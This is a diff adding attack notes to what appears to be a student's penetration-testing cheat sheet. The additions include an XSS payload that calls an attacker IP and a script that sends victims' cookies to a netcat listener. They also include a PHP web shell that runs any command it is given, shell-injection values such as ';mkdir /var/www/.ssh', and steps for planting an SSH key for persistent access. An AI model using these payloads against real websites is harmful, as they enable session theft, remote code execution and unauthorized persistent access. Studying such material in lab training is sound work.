@@ -50,5 +50,47 @@ proxychains nc (targetip) (taget port)
 ### http-enum.nse
     A scirpt that can be used with nmao to enum the website off a webserver
     nmap --scripts=http-enum.nse <ip>
+## Methods of site traversal
 ### Inspect websever / Console
+        changeText()
 
+### Cross-site scripting (XSS)
+        <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
+        setup nc -l on machine
+        <script>document.location="http://<ip of nc listener:port>/Cookie_Stealer1.php?username=" + document.cookie;</script>
+### stored javascript components 
+        <script>alert('XSS');</script>
+### ../
+        
+### malicous file upload
+    <HTML><BODY>
+    <FORM METHOD="GET" NAME="myform" ACTION="">
+    <INPUT TYPE="text" NAME="cmd">
+    <INPUT TYPE="submit" VALUE="Send">
+    </FORM>
+    <pre>
+    <?php
+    if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+    ?>
+    </pre>
+    </BODY></HTML>
+### Command injection
+
+##ssh key upload
+### generate our key
+    ssh-keygen -t rsa -b 4096
+    No Passphrase
+    cat /home/student/.ssh/id_rsa.pub
+
+    #copy and paste the WHOLE key
+### Prepare website > cmd injection > know users and home directories (/etc/passwd)
+make /.ssh in the users home directory
+;mkdir /var/www/.ssh
+;ls -la /var/www
+
+    
+    
+        
+        
